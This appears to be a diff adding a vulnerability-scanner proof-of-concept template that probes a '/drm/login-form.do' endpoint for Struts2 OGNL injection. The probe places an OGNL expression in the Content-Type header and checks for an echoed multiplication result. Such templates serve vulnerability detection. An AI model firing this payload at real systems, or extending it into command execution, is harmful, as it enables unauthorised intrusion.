@@ -1,0 +1,19 @@
+name: poc-yaml-qianyan
+rules:
+  - method: GET
+    path: /drm/login-form.do
+    headers:
+      Accept-Encoding: gzip
+      User-Agent: >-
+        Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        (KHTML,         like Gecko) Chrome/90.0.4430.212 Safari/537.36
+      Content-Type: >-
+        %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-RES',40870*41156)}.multipart/form-data
+    follow_redirects: true
+    expression: |
+      response.status==200&&response.headers['X-RES']=="1682045720"
+
+detail:
+  author: xxx(https://xxx.github.io/)
+  links:
+    - http://118.112.177.33:8500/
